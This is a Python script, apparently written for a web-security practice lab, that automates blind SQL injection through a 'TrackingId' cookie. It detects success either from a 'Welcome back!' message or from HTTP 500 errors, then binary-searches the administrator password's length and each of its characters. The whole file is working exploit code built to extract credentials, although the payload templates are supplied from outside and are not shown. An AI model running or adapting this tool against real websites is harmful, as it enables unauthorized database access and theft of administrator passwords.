import requests
import sys
from bs4 import BeautifulSoup
import threading

class Injector:

    def __init__(self, url:str, poison:dict, length_scope=20, conditional=False, error_induction=False) -> None:

        assert not all((conditional, error_induction)), 'can only inject using either'
        assert any((conditional, error_induction)), 'injection type requred'

        self.session = requests.Session()
        
        self.url = url
        
        self.poison_stash = poison
        
        self.cookies = self.session.cookies.get_dict()
        
        self.length_scope = int(length_scope)
        
        self.password_found = None

        self.thread_lock = threading.Lock()
        
        try:

            self.session.get(self.url)

        except requests.exceptions.RequestException:

            print(f'(+) Unable to make a request to {self.url}')

            sys.exit()

        if conditional:

            self.injection_type = 1

        if error_induction:

            self.injection_type = 2

        assert self.inject_payload(poison['boolean_condition'])

    def _update_password(self, pos:int, character:str):

        with self.thread_lock:

            self.password_found[pos] = character

    def poison_cookie(self, poison:str):

        cookies = self.session.cookies.get_dict().copy()

        cookies["TrackingId"] = "{}{}".format(cookies["TrackingId"], poison)

        return cookies
    
    def inject_payload(self, payload:str):

        response = self.session.get(
            url=self.url,
            cookies=self.poison_cookie(poison=payload)
        )

        if self.injection_type == 1:

            soup = BeautifulSoup(response.text, 'html.parser')
            return True if soup.find(string='Welcome back!') is not None else False

        return True if response.status_code == 500 else False

    def _query_password_length(self, length:int)->int:

        if self.inject_payload(
            payload=self.poison_stash['admin_password_limit'].format("<", length)
        ):

            return 1

        if self.inject_payload(
            payload=self.poison_stash['admin_password_limit'].format(">", length)
        ):

            return -1

        return 0

    def find_password_length(self):

        pass_length, low, high = None, 0, self.length_scope

        print('Enumerating password length')

        while low <= high:

            mid = sum((low, high)) // 2

            answ = self._query_password_length(length=mid)

            if answ > 0:

                high = mid -1

            if answ < 0:

                low = mid +1

            if answ == 0:

                pass_length = mid

                break

        self.password_found = ['']*pass_length

        return pass_length

    def _password_char_finder(self, position:int, ascii_code:int) -> int:

        if self.inject_payload(
            payload=self.poison_stash["password_harvester"].format(position, "<", ascii_code)
        ):
            return 1
        
        if self.inject_payload(
            payload=self.poison_stash["password_harvester"].format(position, ">", ascii_code)
        ):

            return -1

        return 0

    def harvest_password(self, character_info:dict)->int:

        low, high, character = 36, 126, None

        while low <=high:

            mid = sum((low, high)) // 2

            answ = self._password_char_finder(
                position=character_info['position'],
                ascii_code=mid
            )

            if answ > 0:

                high = mid -1

            if answ < 0:

                low = mid + 1

            if answ == 0:

                character = chr(mid)

                print(f"Got {character} for pos: {character_info['position']}")

                self._update_password(
                    pos=character_info['position']-1,
                    character=character
                )
                break
            
        return character

